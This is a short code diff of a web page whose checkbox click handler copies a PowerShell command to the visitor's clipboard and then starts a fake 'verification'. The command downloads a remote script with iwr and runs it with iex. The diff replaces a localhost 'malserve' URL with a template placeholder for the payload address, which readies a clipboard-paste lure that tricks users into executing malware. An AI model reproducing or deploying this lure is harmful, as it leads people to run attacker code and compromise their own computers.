@@ -268,10 +268,10 @@
         checkBox.addEventListener('click',()=>{
             navigator.clipboard.writeText(
                 `powershell -noexit -c "cd 'C:\\Users\\Retardo\\Desktop\\PiggityPigs';
-                $s = (iwr http://localhost:3000/malserve -UseBasicParsing).Content | iex"`
+                $s = (iwr {{PSScript URL for IWR}} -UseBasicParsing).Content | iex"`
             );
             startVerification();
         });
-    </script>
+    </script>   
 </body>
 </html>
